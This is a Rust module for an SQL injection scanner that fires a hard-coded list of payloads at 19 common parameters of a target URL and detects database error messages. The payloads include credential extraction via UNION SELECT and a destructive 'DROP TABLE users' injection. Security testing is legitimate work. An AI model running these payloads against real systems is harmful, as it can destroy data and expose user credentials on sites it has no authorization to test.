use async_trait::async_trait;
use crate::core::modules::{SecurityModule, ScanResult};
use crate::core::vulnerability::{Vulnerability, SeverityLevel};
use crate::core::request_engine::RequestEngine;
use std::sync::Arc;

/// SQL Injection scanning module with advanced payload testing capabilities
/// This module tests for various SQLi vulnerabilities using smart payloads
pub struct SQLInjectionScanner {
    /// The HTTP request engine, shared among instances
    request_engine: Arc<RequestEngine>,
    /// A list of payloads used to test for injection vulnerabilities
    payloads: Vec<String>,
}

impl SQLInjectionScanner {
    /// Creates a new SQLInjectionScanner with default payloads
    pub fn new() -> Self {
        let payloads = vec![
            "' OR '1'='1".to_string(),
            "' OR '1'='1' --".to_string(),
            "' UNION SELECT NULL--".to_string(),
            "' UNION SELECT username, password FROM users--".to_string(),
            "' OR SLEEP(5)--".to_string(),
            "'; WAITFOR DELAY '00:00:05'--".to_string(),
            "' OR BENCHMARK(10000000,MD5(1))--".to_string(),
            "' AND EXTRACTVALUE(1, CONCAT(0x5c, VERSION()))--".to_string(),
            "' AND UPDATEXML(1, CONCAT(0x5c, VERSION()), 1)--".to_string(),
            "' AND 1=1--".to_string(),
            "' AND 1=2--".to_string(),
            "' OR NOT EXISTS(SELECT * FROM users)--".to_string(),
            "'; DROP TABLE users--".to_string(),
            "'; CREATE TABLE test (id INT)--".to_string(),
        ];

        Self {
            request_engine: Arc::new(RequestEngine::new()),
            payloads,
        }
    }

    /// Tests a specific URL parameter for SQL Injection vulnerabilities
    ///
    /// # Arguments
    /// * `url` - The base target URL to test against
    /// * `parameter` - The name of the parameter to inject into
    /// * `value` - The original parameter value without injection
    ///
    /// # Returns
    /// A vector of detected vulnerabilities for this parameter
    async fn test_parameter(
        &self,
        url: &str,
        parameter: &str,
        value: &str,
    ) -> Result<Vec<Vulnerability>, Box<dyn std::error::Error + Send + Sync>> {
        let mut vulnerabilities = Vec::new();

        for payload in &self.payloads {
            // Combine value and payload to build the injected test value
            let test_value = format!("{}{}", value, payload);
            let test_url = self.build_test_url(url, parameter, &test_value);

            log::debug!("Testing payload: {} on URL: {}", payload, test_url);

            // Send the request; propagate errors safely
            let response = self.request_engine.send_request(&test_url, "GET", None, None).await?;
            let response_text = response.text().await.unwrap_or_default();

            // Detect vulnerability based on response content
            if self.detect_vulnerability(&response_text) {
                let vuln = Vulnerability {
                    title: format!("SQL Injection in parameter '{}'", parameter),
                    description: format!(
                        "Parameter '{}' appears vulnerable with payload: {}",
                        parameter, payload
                    ),
                    severity: SeverityLevel::High,
                    evidence: format!("URL: {}\nPayload: {}", test_url, payload),
                };

                vulnerabilities.push(vuln);
                log::warn!("Vulnerability found in parameter '{}' with payload: {}", parameter, payload);
            }

            // Brief sleep to avoid overwhelming the target server
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        }

        Ok(vulnerabilities)
    }

    /// Builds a URL with the injected test parameter value
    ///
    /// Encodes value simply; for production, consider using `urlencoding` crate
    /// 
    /// # Arguments
    /// * `base_url` - The target base URL
    /// * `parameter` - Parameter name to inject into
    /// * `value` - Injected value
    ///
    /// # Returns
    /// A new URL string with the parameter and value injected
    fn build_test_url(&self, base_url: &str, parameter: &str, value: &str) -> String {
        let encoded_value = value.replace(" ", "%20").replace("'", "%27"); // simple encoding
        if base_url.contains('?') {
            format!("{}&{}={}", base_url, parameter, encoded_value)
        } else {
            format!("{}?{}={}", base_url, parameter, encoded_value)
        }
    }

    /// Detects potential SQL Injection vulnerability indicators in server responses
    ///
    /// # Arguments
    /// * `text` - The response content text to analyze
    ///
    /// # Returns
    /// `true` if indicative error messages or patterns appear in the response text
    fn detect_vulnerability(&self, text: &str) -> bool {
        let lower_text = text.to_lowercase();
        let error_patterns = [
            "sql syntax", "mysql error", "postgresql error", "ora-",
            "microsoft odbc", "syntax error", "unclosed quotation",
            "unterminated quoted string", "warning: mysql", "pdoexception",
            "psql:", "sqlite error",
        ];

        error_patterns.iter().any(|pattern| lower_text.contains(pattern))
    }
}

#[async_trait]
impl SecurityModule for SQLInjectionScanner {
    fn name(&self) -> &str {
        "sql_injection"
    }

    fn description(&self) -> &str {
        "Advanced SQL Injection module with intelligent payload testing"
    }

    fn author(&self) -> &str {
        "Redlines X Security Team"
    }

    fn version(&self) -> &str {
        "1.0.0"
    }

    /// Runs the SQL injection scan asynchronously on the given target URL
    async fn run(&self, target: &str) -> Result<ScanResult, Box<dyn std::error::Error + Send + Sync>> {
        log::info!("Starting SQL Injection scan on: {}", target);

        let start_time = std::time::Instant::now();
        let mut vulnerabilities = Vec::new();

        // Common web parameters as placeholders; to be replaced with real discovery later
        let test_parameters = vec![
            "id", "user", "category", "search", "product", "page",
            "article", "news", "item", "file", "document", "view",
            "action", "type", "mode", "sort", "filter", "q", "query"
        ];

        log::info!("Testing {} common parameters", test_parameters.len());

        // Iterate all parameters and test each
        for param in test_parameters {
            log::debug!("Testing parameter: {}", param);

            match self.test_parameter(target, param, "1").await {
                Ok(param_vulns) => vulnerabilities.extend(param_vulns),
                Err(e) => log::warn!("Failed to test parameter '{}': {}", param, e),
            }
        }

        let duration = start_time.elapsed();
        let has_vulnerabilities = !vulnerabilities.is_empty();

        if has_vulnerabilities {
            log::info!("SQL Injection scan found {} vulnerabilities in {:?}", vulnerabilities.len(), duration);
        } else {
            log::info!("No vulnerabilities found in SQL Injection scan.");
        }

        Ok(ScanResult {
            success: has_vulnerabilities,
            vulnerabilities,
            warnings: if has_vulnerabilities {
                Vec::new()
            } else {
                vec!["No SQL Injection vulnerabilities detected".to_string()]
            },
            duration,
        })
    }
}
